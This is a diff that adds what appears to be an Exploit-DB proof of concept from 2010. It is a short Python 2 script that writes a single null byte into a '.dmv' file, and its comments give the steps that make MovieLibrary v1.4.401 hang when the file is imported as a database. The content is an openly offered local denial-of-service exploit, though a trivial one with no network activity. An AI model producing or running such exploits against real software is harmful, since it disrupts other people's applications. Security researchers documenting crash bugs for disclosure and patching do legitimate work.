@@ -1,0 +1,27 @@
+# Exploit Title: MovieLibrary Local Dos .dmv file
+# Date: April 14, 2010
+# Software Link: [http://wensoftware.com/]
+# Version: v1.4.401
+# Tested on: Windows XP SP3
+# Author: [anonymous]
+# Site: [www.setfreesecurity.com]
+# 
+# At the top: Click -> New -> Open
+# Open the newly created dmv file
+# Click File ->  Import Database
+# Program will stop responding after about 5 sec
+#
+# Greetz to the Exploit-DB Crew and More Coffee!
+# I AM YOU
+#
+#!/usr/bin/env python
+import time
+
+print "Press Play >\n"
+time.sleep(1)
+
+VHS=open('oldies.dmv', 'w')
+VHS.write('\x00')
+VHS.close()
+
+print 'Running Time: Approximately 5 sec till DoS.\n'
